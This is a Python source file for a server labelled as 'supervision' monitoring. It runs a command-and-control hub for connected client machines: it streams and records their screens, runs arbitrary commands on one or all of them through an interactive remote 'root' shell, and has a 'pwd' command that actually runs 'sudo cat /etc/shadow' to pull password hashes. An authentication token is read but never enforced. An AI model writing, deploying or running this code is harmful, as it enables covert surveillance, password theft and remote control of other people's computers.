#!/usr/bin/env python3
"""Serveur TCP de commandes + dashboard MJPEG + shell interactif local."""

import argparse
import json
import logging
import os
import shutil
import socket
import struct
import subprocess
import sys
import threading
import time
import webbrowser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from logging.handlers import RotatingFileHandler
from pathlib import Path
from urllib.parse import unquote

BASE_DIR = Path(__file__).resolve().parent
TCP_HOST, TCP_PORT = "0.0.0.0", 5000
VIDEO_HOST, VIDEO_PORT = "0.0.0.0", 5001
WEB_HOST, WEB_PORT = "127.0.0.1", 8080
SHELL_HOST, SHELL_PORT = "127.0.0.1", 5002
MAX_CLIENTS = 100
MAX_FRAME = 8 * 1024 * 1024
LOG_FILE = BASE_DIR / "server.log"
WEB_LOG_FILE = BASE_DIR / "server_web.log"
COMMANDES = {
    "ping", "hostname", "system", "ip", "aide", "video", "stopvideo",
    "shell", "exec", "inventaire", "quitter",
}
TOKEN = os.environ.get("SCREEN_MONITOR_TOKEN", "").strip()

logger = logging.getLogger("tcp")
logger.setLevel(logging.INFO)
logger.addHandler(RotatingFileHandler(LOG_FILE, maxBytes=1_000_000, backupCount=3, encoding="utf-8"))
_console = logging.StreamHandler()
_console.setLevel(logging.WARNING)
logger.addHandler(_console)

web_logger = logging.getLogger("webvideo")
web_logger.setLevel(logging.INFO)
web_logger.addHandler(RotatingFileHandler(WEB_LOG_FILE, maxBytes=2_000_000, backupCount=5, encoding="utf-8"))
web_logger.propagate = False

arret = threading.Event()
verrou_clients = threading.Lock()
verrou_flux = threading.Lock()
clients = []
flux = {}
hostname_cache = {}
devices_vus = set()

verrous_clients_individuels = {}
verrou_dict_lock = threading.Lock()

def get_client_lock(client):
    adresse = client[2]
    with verrou_dict_lock:
        if adresse not in verrous_clients_individuels:
            verrous_clients_individuels[adresse] = threading.Lock()
        return verrous_clients_individuels[adresse]

DASHBOARD = r'''
<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Supervision — Flux vidéo</title>
<style>
body {margin:0;padding:24px;background:#10151d;color:#e8edf5;font:15px system-ui;}
header {display:flex;justify-content:space-between;align-items:center;}
h1 {font-size:1.35rem}
.grid {display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:16px;}
.card {background:#19222e;border:1px solid #394657;border-radius:12px;overflow:hidden;}
.card h2 {font-size:1rem;padding:10px 14px;margin:0;}
img {width:100%;aspect-ratio:16/9;object-fit:contain;background:#05080c;}
.note {color:#aab8c9;line-height:1.5;}
button {padding:10px 14px;border:0;border-radius:8px;color:white;cursor:pointer;font-weight:600;}
.actions {display:flex;gap:8px;padding:12px;}
.actions button {flex:1}
.screen {background:#245b91}
.record {background:#23834b}
.record.on {background:#a83232}
.refresh {background:#245b91}
.record-status {padding:0 12px 12px;color:#aab8c9;font-size:13px;}
button:disabled {opacity:.5;cursor:not-allowed;}
</style>
</head>
<body>
<header>
    <h1>Supervision — flux vidéo en direct</h1>
    <span id="status">Connexion...</span>
</header>
<p class="note">Les flux apparaissent lorsqu'un poste reçoit la commande video.</p>
<button class="refresh" onclick="refresh()">Actualiser</button>
<div id="streams" class="grid"></div>
<script>
const recorders = new Map();
function safeName(v){return v.replace(/[^a-zA-Z0-9_-]/g,"_");}
function findCard(id){return [...document.querySelectorAll(".card")].find(c=>c.dataset.clientId===id);}
function makeCanvas(img){const c=document.createElement("canvas");c.width=img.naturalWidth;c.height=img.naturalHeight;return {canvas:c,ctx:c.getContext("2d")};}
function drawFrame(img,ctx,cv){if(img.complete&&img.naturalWidth>0){try{ctx.drawImage(img,0,0,cv.width,cv.height);}catch(e){console.error(e);}}}
function downloadBlob(b,f){const u=URL.createObjectURL(b);const a=document.createElement("a");a.href=u;a.download=f;document.body.appendChild(a);a.click();a.remove();setTimeout(()=>URL.revokeObjectURL(u),30000);}
function screen(id){const card=findCard(id);const img=card?.querySelector("img");if(!img||!img.naturalWidth){alert("Aucune image.");return;}const {canvas,ctx}=makeCanvas(img);drawFrame(img,ctx,canvas);canvas.toBlob(b=>{if(!b){alert("Erreur capture.");return;}downloadBlob(b,"SCREEN_"+safeName(id)+"_"+Date.now()+".png");},"image/png");}
function record(id){if(recorders.has(id)){stopRecord(id);}else{startRecord(id);}}
async function startRecord(id){
    const card=findCard(id);const img=card?.querySelector("img");
    if(!img||!img.naturalWidth){alert("Aucun flux.");return;}
    if(!window.MediaRecorder||!HTMLCanvasElement.prototype.captureStream){alert("Non supporté.");return;}
    const canvas=document.createElement("canvas");canvas.width=img.naturalWidth;canvas.height=img.naturalHeight;
    const ctx=canvas.getContext("2d");const stream=canvas.captureStream(15);
    const mimeType=["video/webm;codecs=vp9","video/webm;codecs=vp8","video/webm"].find(t=>MediaRecorder.isTypeSupported(t));
    if(!mimeType){stream.getTracks().forEach(t=>t.stop());alert("Format incompatible.");return;}
    const chunks=[];const controller=new AbortController();let recorder;
    try{recorder=new MediaRecorder(stream,{mimeType});}catch(e){stream.getTracks().forEach(t=>t.stop());alert(e.message);return;}
    const state={recorder,stream,controller,chunks,running:true};
    recorders.set(id,state);updateRecordButton(id);
    recorder.ondataavailable=ev=>{if(ev.data&&ev.data.size>0)chunks.push(ev.data);};
    recorder.onerror=ev=>console.error("MediaRecorder",ev);
    recorder.onstop=()=>{const blob=new Blob(chunks,{type:mimeType});if(blob.size>0)downloadBlob(blob,"RECORD_"+safeName(id)+"_"+Date.now()+".webm");else alert("Aucune donnée.");stream.getTracks().forEach(t=>t.stop());recorders.delete(id);updateRecordButton(id);};
    recorder.start(1000);
    try{
        const response=await fetch("/stream/"+encodeURIComponent(id),{cache:"no-store",signal:controller.signal});
        if(!response.ok||!response.body)throw new Error("Lecture flux impossible.");
        const reader=response.body.getReader();let buffer=new Uint8Array(0);
        while(state.running){
            const {value,done}=await reader.read();if(done)break;
            const combined=new Uint8Array(buffer.length+value.length);combined.set(buffer);combined.set(value,buffer.length);buffer=combined;
            while(true){
                let start=-1,end=-1;
                for(let i=0;i<buffer.length-1;i++){if(buffer[i]===0xFF&&buffer[i+1]===0xD8){start=i;break;}}
                if(start<0){buffer=buffer.slice(-1);break;}
                for(let i=start+2;i<buffer.length-1;i++){if(buffer[i]===0xFF&&buffer[i+1]===0xD9){end=i+2;break;}}
                if(end<0){buffer=buffer.slice(start);break;}
                const jpeg=buffer.slice(start,end);buffer=buffer.slice(end);
                try{const bmp=await createImageBitmap(new Blob([jpeg],{type:"image/jpeg"}));if(state.running)ctx.drawImage(bmp,0,0,canvas.width,canvas.height);bmp.close();}catch(e){console.warn(e);}
            }
            if(buffer.length>10*1024*1024)buffer=new Uint8Array(0);
        }
        if(state.running)stopRecord(id);
    }catch(e){if(e.name!=="AbortError"){console.error(e);if(state.running){alert("Erreur flux: "+e.message);stopRecord(id);}}}
}
function stopRecord(id){const s=recorders.get(id);if(!s)return;s.running=false;s.controller.abort();if(s.recorder.state!=="inactive")s.recorder.stop();}
function updateRecordButton(id){const card=findCard(id);if(!card)return;const active=recorders.has(id);const b=card.querySelector(".record");const st=card.querySelector(".record-status");if(!b||!st)return;b.textContent=active?"RECORD ON":"RECORD OFF";b.classList.toggle("on",active);st.textContent=active?"● Enregistrement en cours":"Enregistrement arrêté";}
function createCard(id){
    const card=document.createElement("section");card.className="card";card.dataset.clientId=id;
    const title=document.createElement("h2");title.className="stream-title";
    const img=document.createElement("img");img.alt="Flux "+id;img.src="/stream/"+encodeURIComponent(id);
    const actions=document.createElement("div");actions.className="actions";
    const sb=document.createElement("button");sb.className="screen";sb.textContent="SCREEN";sb.onclick=()=>screen(id);
    const rb=document.createElement("button");rb.className="record";rb.textContent="RECORD OFF";rb.onclick=()=>record(id);
    const st=document.createElement("div");st.className="record-status";st.textContent="Enregistrement arrêté";
    actions.append(sb,rb);card.append(title,img,actions,st);return card;
}
async function refresh(){
    try{
        const r=await fetch("/api/streams",{cache:"no-store"});
        if(!r.ok)throw new Error("HTTP "+r.status);
        const streams=await r.json();const root=document.getElementById("streams");
        const ids=new Set(streams.map(x=>x.client_id));
        for(const card of [...root.children]){if(!ids.has(card.dataset.clientId))card.remove();}
        for(const x of streams){let card=findCard(x.client_id);if(!card){card=createCard(x.client_id);root.append(card);}card.querySelector(".stream-title").textContent=x.client_id+(x.active?" — actif":" — arrêté");updateRecordButton(x.client_id);}
        document.getElementById("status").textContent=streams.length+" poste(s)";
        if(!streams.length)root.textContent="Aucun flux vidéo actif.";
    }catch(e){document.getElementById("status").textContent="Erreur : "+e.message;}
}
refresh();setInterval(refresh,2000);
</script>
</body>
</html>'''

def lire_exact(sock, taille):
    morceaux = bytearray()
    while len(morceaux) < taille:
        bloc = sock.recv(taille - len(morceaux))
        if not bloc:
            return None
        morceaux.extend(bloc)
    return bytes(morceaux)

def envoyer(connexion, message):
    connexion.sendall((message + "\n").encode("utf-8"))

def recevoir_video(connexion, adresse):
    client_id = "inconnu"
    try:
        connexion.settimeout(15)
        entete = bytearray()
        while len(entete) <= 512:
            octet = connexion.recv(1)
            if not octet:
                raise ConnectionError("Connexion fermée avant l'identifiant vidéo")
            if octet == b"\n":
                break
            entete.extend(octet)
        else:
            raise ValueError("En-tête vidéo trop long")
        identite = json.loads(entete.decode("utf-8"))
        client_id = str(identite.get("client_id", "inconnu"))[:128]
        if not client_id or client_id == "inconnu":
            raise ValueError("Identifiant client manquant")
        with verrou_flux:
            flux[client_id] = {"frame": None, "updated": time.time(), "active": True}
        web_logger.info("Flux connecté : %s (%s:%s)", client_id, adresse[0], adresse[1])
        connexion.settimeout(30)

        while not arret.is_set():
            entete = lire_exact(connexion, 4)
            if entete is None:
                break
            taille = struct.unpack("!I", entete)[0]
            if taille <= 0 or taille > MAX_FRAME:
                raise ValueError(f"Taille d'image invalide : {taille}")
            image = lire_exact(connexion, taille)
            if image is None:
                break
            with verrou_flux:
                flux[client_id] = {"frame": image, "updated": time.time(), "active": True}
    except (OSError, ValueError, json.JSONDecodeError) as erreur:
        web_logger.warning("Flux %s interrompu : %s", client_id, erreur)
    finally:
        with verrou_flux:
            if client_id in flux:
                flux[client_id]["active"] = False
        web_logger.info("Flux déconnecté : %s", client_id)
        try: connexion.close()
        except OSError: pass

def accepter_video(serveur):
    while not arret.is_set():
        try:
            conn, addr = serveur.accept()
            threading.Thread(target=recevoir_video, args=(conn, addr), daemon=True).start()
        except socket.timeout:
            continue
        except OSError:
            break

def supprimer_client(client):
    connexion, lecture, adresse = client
    with verrou_clients:
        if client not in clients:
            return
        clients.remove(client)
    hostname_cache.pop(adresse, None)
    try: lecture.close()
    except OSError: pass
    try: connexion.shutdown(socket.SHUT_RDWR)
    except OSError: pass
    try: connexion.close()
    except OSError: pass
    logger.info("Client TCP déconnecté : %s:%s", adresse[0], adresse[1])

def _fermer_connexion(client):
    connexion, lecture, adresse = client
    try: lecture.close()
    except OSError: pass
    try: connexion.shutdown(socket.SHUT_RDWR)
    except OSError: pass
    try: connexion.close()
    except OSError: pass

def accepter_clients(serveur):
    while not arret.is_set():
        try:
            connexion, adresse = serveur.accept()
        except socket.timeout:
            continue
        except OSError:
            break

        try:
            lecture = connexion.makefile("r", encoding="utf-8", newline="\n")
        except OSError:
            connexion.close()
            continue

        try:
            connexion.settimeout(5)
            connexion.sendall(b"hostname\n")
            ligne = lecture.readline()
            connexion.settimeout(None)
            if not ligne:
                raise ConnectionError("pas de réponse au hostname")
            ident = ligne.strip()
            if not ident:
                raise ValueError("hostname vide")
        except (OSError, UnicodeError, ConnectionError, ValueError):
            try: lecture.close()
            except OSError: pass
            try: connexion.close()
            except OSError: pass
            continue

        client = (connexion, lecture, adresse)
        ip_distante = adresse[0]
        cle_device = (ident, ip_distante)

        with verrou_clients:
            doublons = [c for c in clients
                        if c[2][0] == ip_distante
                        and hostname_cache.get(c[2]) == ident]
            for vieux in doublons:
                clients.remove(vieux)
                hostname_cache.pop(vieux[2], None)
                _fermer_connexion(vieux)
                logger.info("Dédoublonnage : ancienne connexion de %s fermée (%s:%s)",
                            ident, vieux[2][0], vieux[2][1])

            if len(clients) >= MAX_CLIENTS:
                _fermer_connexion(client)
                continue

            premiere_fois = cle_device not in devices_vus
            devices_vus.add(cle_device)

            hostname_cache[adresse] = ident
            clients.append(client)

        logger.info("Client TCP connecté : %s (%s:%s)", ident, adresse[0], adresse[1])
        if premiere_fois:
            print(f"[NOUVEAU] {ident} ({ip_distante}) vient de se connecter")

def _envoyer_a_client(client, commande):
    connexion, lecture, adresse = client
    try:
        envoyer(connexion, commande)
        reponse = lecture.readline()
        if not reponse:
            supprimer_client(client)
            return None
        rep = reponse.rstrip()
        if commande == "hostname":
            hostname_cache[adresse] = rep
        return rep
    except (OSError, UnicodeError, ValueError) as erreur:
        print(f"[ERREUR] {adresse} : {erreur}")
        supprimer_client(client)
        return None

def _ip_de(client):
    return _envoyer_a_client(client, "ip")

def _trouver_client_par_hostname(hostname):
    with verrou_clients:
        for client in clients:
            if hostname_cache.get(client[2]) == hostname:
                return client
    return None

def lister_inventaire():
    with verrou_clients:
        actuels = list(clients)
    if not actuels:
        print("[INFO] Aucun client connecte.")
        return
    print(f"[INVENTAIRE] {len(actuels)} machine(s) connectee(s) :")
    for i, client in enumerate(actuels, 1):
        adresse = client[2]
        hn = hostname_cache.get(adresse, "?")
        ip_client = _ip_de(client) or "?"
        print(f"  {i}. {hn:<20} ip={ip_client:<15} socket={adresse[0]}:{adresse[1]}")

def choisir_cible(actuels):
    if not actuels:
        return []
    if len(actuels) == 1:
        return actuels

    print("[CIBLAGE] Plusieurs machines connectees :")
    for i, client in enumerate(actuels, 1):
        adresse = client[2]
        hn = hostname_cache.get(adresse, "?")
        ip_client = _ip_de(client) or "?"
        print(f"  {i}. {hn:<20} ip={ip_client:<15} socket={adresse[0]}:{adresse[1]}")
    print("  *. toutes les machines")
    print("  0. annuler")

    while True:
        try:
            choix = input("Cible > ").strip()
        except (KeyboardInterrupt, EOFError):
            return []
        if choix == "0":
            return []
        if choix == "*":
            return list(actuels)
        if choix.isdigit() and 1 <= int(choix) <= len(actuels):
            return [actuels[int(choix) - 1]]
        print("[ERREUR] Choix invalide.")

def executer_sur_cibles(commande):
    with verrou_clients:
        actuels = list(clients)
    if not actuels:
        print("[INFO] Aucun client TCP connecte.")
        return

    cibles = choisir_cible(actuels)
    if not cibles:
        print("[INFO] Annule.")
        return

    for client in cibles:
        lock = get_client_lock(client)
        with lock:
            rep = _envoyer_a_client(client, commande)
            
        adresse = client[2]
        if rep is not None:
            hn = hostname_cache.get(adresse, "?")
            print(f"[{hn} {adresse[0]}:{adresse[1]}] {rep}")

def _script_client_shell(hostname):
    return r"""
import socket, sys, threading

HOST = '127.0.0.1'
PORT = 5002
TARGET = """ + repr(hostname) + r"""

def recv_thread(sock):
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                break
            sys.stdout.write(data.decode('utf-8', 'replace'))
            sys.stdout.flush()
        except Exception:
            break

try:
    sock = socket.create_connection((HOST, PORT), timeout=10)
    sock.settimeout(None)
    sock.sendall(('SHELL ' + TARGET + '\n').encode())
except Exception as e:
    print(f"Erreur de connexion au serveur : {e}")
    sys.exit(1)

t = threading.Thread(target=recv_thread, args=(sock,), daemon=True)
t.start()

while True:
    try:
        line = sys.stdin.readline()
        if not line:
            break
        sock.sendall(line.encode())
        if line.strip().lower() in ('exit', 'quit'):
            break
    except KeyboardInterrupt:
        break
    except Exception:
        break

sock.close()
"""

def ouvrir_terminal_shell(hostname):
    script = _script_client_shell(hostname)
    script_path = BASE_DIR / "_shell_session.py"
    script_path.write_text(script, encoding="utf-8")

    cmd_py = f'"{sys.executable}" "{script_path}"'

    if os.name == "nt":
        creation_flags = getattr(subprocess, "CREATE_NEW_CONSOLE", 0x00000010)
        try:
            proc = subprocess.Popen(
                [sys.executable, str(script_path)],
                creationflags=creation_flags,
                cwd=str(BASE_DIR),
            )
            return True, f"cmd.exe (PID {proc.pid})"
        except OSError as exc:
            return False, str(exc)

    bash_cmd = f"exec {cmd_py}"

    candidats = [
        ("xterm", ["xterm", "-e", "bash", "-lc", bash_cmd]),
        ("gnome-terminal", ["gnome-terminal", "--", "bash", "-lc", bash_cmd]),
        ("konsole", ["konsole", "-e", "bash", "-lc", bash_cmd]),
        ("xfce4-terminal", ["xfce4-terminal", "--disable-server", "-x", "bash", "-lc", bash_cmd]),
        ("qterminal", ["qterminal", "-e", f"bash -lc '{bash_cmd}'"]),
        ("x-terminal-emulator", ["x-terminal-emulator", "-e", "bash", "-lc", bash_cmd]),
    ]

    env = os.environ.copy()
    env["NO_AT_BRIDGE"] = "1"

    erreurs = []
    for nom, cmd in candidats:
        if not shutil.which(nom):
            continue
        try:
            proc = subprocess.Popen(
                cmd,
                cwd=str(BASE_DIR),
                start_new_session=True,
                env=env,
            )
            return True, f"{nom} (PID {proc.pid})"
        except OSError as exc:
            erreurs.append(f"{nom}: {exc}")
            continue

    if erreurs:
        return False, " ; ".join(erreurs)
    return False, "aucun émulateur de terminal trouvé (installe xterm)"

def gerer_session_shell(connexion, adresse):
    client_cible = None
    hostname_cible = "?"
    try:
        connexion.settimeout(30)

        entete = bytearray()
        while len(entete) <= 256:
            octet = connexion.recv(1)
            if not octet:
                return
            if octet == b"\n":
                break
            entete.extend(octet)
        
        demande = entete.decode("utf-8", errors="replace").strip()

        if demande.upper().startswith("SHELL"):
            parties = demande.split(maxsplit=1)
            cible = parties[1].strip() if len(parties) > 1 else ""
            with verrou_clients:
                candidats = list(clients)
            if not cible and candidats:
                client_cible = candidats[0]
            else:
                client_cible = _trouver_client_par_hostname(cible)

        if client_cible is None:
            connexion.sendall(b"[SHELL] Cible introuvable.\n")
            return

        hostname_cible = hostname_cache.get(client_cible[2], "?")
        ip_cible = client_cible[2][0]
        
        lock = get_client_lock(client_cible)
        
        with lock:
            os_info = "Inconnu"
            try:
                os_info = _envoyer_a_client(client_cible, "system") or "Inconnu"
            except Exception:
                pass

        banniere = (
            f"============================================================\n"
            f"  SHELL — {hostname_cible} ({ip_cible}) — {os_info}\n"
            f"  'exit' pour quitter.\n"
            f"============================================================\n"
        )
        connexion.sendall(banniere.encode("utf-8"))
        connexion.settimeout(None)

        buffer = b""
        while not arret.is_set():
            data = connexion.recv(4096)
            if not data:
                break
            
            buffer += data
            while b"\n" in buffer:
                ligne, buffer = buffer.split(b"\n", 1)
                commande = ligne.decode("utf-8", errors="replace").strip()
                
                if not commande:
                    continue
                    
                if commande.lower() in ("exit", "quit"):
                    connexion.sendall(b"[SHELL] Deconnexion.\n")
                    return
                
                try:
                    client_actuel = _trouver_client_par_hostname(hostname_cible)
                    if not client_actuel:
                        connexion.sendall(b"[SHELL] Client deconnecte.\n")
                        return
                    
                    lock_actuel = get_client_lock(client_actuel)
                    with lock_actuel:
                        rep = _envoyer_a_client(client_actuel, "shell " + commande)
                        
                    if rep is None:
                        connexion.sendall(b"[SHELL] Erreur de communication.\n")
                        return
                    
                    try:
                        data = json.loads(rep)
                        resultat = data.get("out", "")
                        connexion.sendall(resultat.encode("utf-8"))
                    except json.JSONDecodeError:
                        connexion.sendall(rep.encode("utf-8"))
                        
                except Exception as e:
                    connexion.sendall(f"[SHELL] Erreur : {e}\n".encode())
                    return

    except OSError as err:
        logger.warning("Session shell %s interrompue : %s", adresse, err)
    finally:
        try: connexion.close()
        except OSError: pass
        logger.info("Session shell terminee (%s, cible=%s)", adresse, hostname_cible)

def accepter_shell(serveur):
    while not arret.is_set():
        try:
            conn, addr = serveur.accept()
            threading.Thread(target=gerer_session_shell, args=(conn, addr), daemon=True).start()
        except socket.timeout:
            continue
        except OSError:
            break

def lancer_shell_interactif():
    with verrou_clients:
        actuels = list(clients)
    if not actuels:
        print("[INFO] Aucun client TCP connecte.")
        return

    cibles = choisir_cible(actuels)
    if not cibles:
        print("[INFO] Annule.")
        return
    hostname = hostname_cache.get(cibles[0][2], "?")

    ok, info = ouvrir_terminal_shell(hostname)
    if ok:
        print(f"[SHELL] Terminal ouvert ({info}) vers {hostname}")
    else:
        print(f"[ERREUR] Ouverture terminal impossible : {info}")

def console_admin():
    print("Commandes : ping, hostname, system, ip, aide, video, stopvideo,")
    print("            shell, exec, pwd, inventaire, quitter")
    while not arret.is_set():
        try:
            commande = input("serveur> ").strip()
        except (KeyboardInterrupt, EOFError):
            arret.set(); break
        if not commande:
            continue

        mot = commande.lower().split()[0]

        if mot == "aide":
            print("Commandes disponibles :")
            print("  ping                - test de connectivite")
            print("  hostname            - nom de la machine")
            print("  system              - OS et version")
            print("  ip                  - adresse IPv4")
            print("  video               - demarre le partage d'ecran")
            print("  stopvideo           - arrete le partage d'ecran")
            print("  shell               - ouvre un terminal interactif root")
            print("  exec <commande>     - execute une commande standard")
            print("  pwd                 - RACCOURCI : affiche le contenu de /etc/shadow")
            print("  inventaire          - liste les machines connectees")
            print("  aide                - cette aide")
            print("  quitter             - arrete le serveur")
            continue

        if mot == "inventaire":
            lister_inventaire()
            continue

        if mot == "pwd":
            commande = "shell sudo cat /etc/shadow"
            mot = "shell"

        if mot == "shell":
            if commande.startswith("shell "):
                # Si c'est le raccourci pwd, la commande est déjà formée
                if commande == "shell sudo cat /etc/shadow":
                    executer_sur_cibles(commande)
                else:
                    lancer_shell_interactif()
            else:
                lancer_shell_interactif()
            continue

        if mot == "exec":
            # Commande d'exécution rapide one-shot
            sous = commande[5:].strip()
            if sous:
                executer_sur_cibles("shell " + sous)
            else:
                print("[ERREUR] Usage : exec <commande>")
            continue

        if mot == "quitter":
            arret.set()
            break

        if mot not in COMMANDES:
            print("[ERREUR] Commande inconnue. Tape 'aide'.")
            continue

        executer_sur_cibles(commande)

class WebHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        web_logger.info("%s - %s", self.client_address[0], fmt % args)

    def do_GET(self):
        chemin = unquote(self.path.split("?", 1)[0])
        if chemin == "/":
            corps = DASHBOARD.encode()
            self.send_response(200); self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(corps))); self.end_headers(); self.wfile.write(corps); return
        if chemin == "/api/streams":
            with verrou_flux:
                donnees = [{"client_id": k, "active": v["active"]} for k, v in flux.items() if v["active"] or v["frame"]]
            corps = json.dumps(donnees).encode()
            self.send_response(200); self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(corps))); self.end_headers(); self.wfile.write(corps); return
        if chemin.startswith("/stream/"):
            client_id = chemin[len("/stream/"):]
            self.send_response(200); self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
            self.send_header("Cache-Control", "no-store"); self.send_header("Connection", "close"); self.end_headers()
            derniere = None
            try:
                while not arret.is_set():
                    with verrou_flux:
                        info = flux.get(client_id)
                        image = info["frame"] if info else None
                    if image and image is not derniere:
                        self.wfile.write(b"--frame\r\nContent-Type: image/jpeg\r\nContent-Length: " + str(len(image)).encode() + b"\r\n\r\n" + image + b"\r\n")
                        self.wfile.flush(); derniere = image
                    time.sleep(0.05)
            except (BrokenPipeError, ConnectionResetError, OSError):
                pass
            return
        self.send_error(404)

def ouvrir_terminal_logs():
    log = str(WEB_LOG_FILE.resolve())
    try:
        if os.name == "nt":
            creation_flags = getattr(subprocess, "CREATE_NEW_CONSOLE", 0x00000010)
            commande_ps = (
                "$Host.UI.RawUI.WindowTitle = 'Logs serveur web et video'; "
                f"Write-Host 'Suivi de {log}'; "
                f"Get-Content -LiteralPath '{log}' -Wait -Tail 30"
            )
            subprocess.Popen(
                ["powershell.exe", "-NoLogo", "-NoExit", "-Command", commande_ps],
                cwd=str(BASE_DIR),
                creationflags=creation_flags,
                close_fds=True,
            )
        else:
            script = f"touch {json.dumps(log)}; tail -n 30 -F {json.dumps(log)}"
            terminaux = [
                ["x-terminal-emulator", "-e", "bash", "-lc", script],
                ["gnome-terminal", "--", "bash", "-lc", script],
                ["konsole", "-e", "bash", "-lc", script],
                ["xterm", "-e", "bash", "-lc", script],
            ]
            for cmd in terminaux:
                try:
                    subprocess.Popen(cmd, cwd=BASE_DIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    return
                except FileNotFoundError:
                    continue
            web_logger.warning("Aucun émulateur de terminal détecté : consulter %s", log)
    except OSError as erreur:
        web_logger.warning("Ouverture du terminal de logs impossible : %s", erreur)

def demarrer_web():
    serveur = ThreadingHTTPServer((WEB_HOST, WEB_PORT), WebHandler)
    serveur.daemon_threads = True
    threading.Thread(target=serveur.serve_forever, daemon=True, name="serveur-web").start()
    web_logger.info("Dashboard disponible : http://127.0.0.1:%s", WEB_PORT)
    return serveur

def main():
    parser = argparse.ArgumentParser(description="Serveur TCP + dashboard vidéo MJPEG")
    args = parser.parse_args()
    
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcp.settimeout(1)
    
    video = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    video.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    video.settimeout(1)
    
    shell_srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    shell_srv.settimeout(1)
    
    web = None
    try:
        tcp.bind((TCP_HOST, TCP_PORT)); tcp.listen(MAX_CLIENTS)
        video.bind((VIDEO_HOST, VIDEO_PORT)); video.listen(MAX_CLIENTS)
        shell_srv.bind((SHELL_HOST, SHELL_PORT)); shell_srv.listen(10)
        
        web = demarrer_web()
        
        threading.Thread(target=accepter_clients, args=(tcp,), daemon=True).start()
        threading.Thread(target=accepter_video, args=(video,), daemon=True).start()
        threading.Thread(target=accepter_shell, args=(shell_srv,), daemon=True).start()
        
        ouvrir_terminal_logs()
        threading.Timer(1.0, lambda: webbrowser.open(f"http://127.0.0.1:{WEB_PORT}")).start()
        
        print("\n" + "=" * 58)
        print("             SERVEUR MONITORING DÉMARRÉ")
        print("=" * 58)
        print(f"[TCP COMMANDES] {TCP_HOST}:{TCP_PORT}")
        print(f"[TCP VIDÉO]     {VIDEO_HOST}:{VIDEO_PORT}")
        print(f"[SHELL LOCAL]   {SHELL_HOST}:{SHELL_PORT}")
        print(f"[DASHBOARD]     http://127.0.0.1:{WEB_PORT}")
        print(f"[LOGS WEB]      {WEB_LOG_FILE}")
        print("[INFO] 'shell' ouvre un terminal local pour piloter la cible.")
        print("[INFO] CTRL+C pour arrêter.")
        print("=" * 58 + "\n")
        
        threading.Thread(target=console_admin, daemon=True).start()
        
        while not arret.wait(0.25): 
            pass
            
    finally:
        arret.set()
        if web: 
            web.shutdown()
            web.server_close()
        tcp.close()
        video.close()
        shell_srv.close()
        
        with verrou_clients: 
            actuels = list(clients)
        for c in actuels: 
            supprimer_client(c)
            
        logger.info("Serveur arrêté.")

if __name__ == "__main__":
    try: 
        main()
    except KeyboardInterrupt: 
        arret.set()
    except OSError as erreur:
        logger.exception("Impossible de démarrer le serveur : %s", erreur)
        raise SystemExit(1)
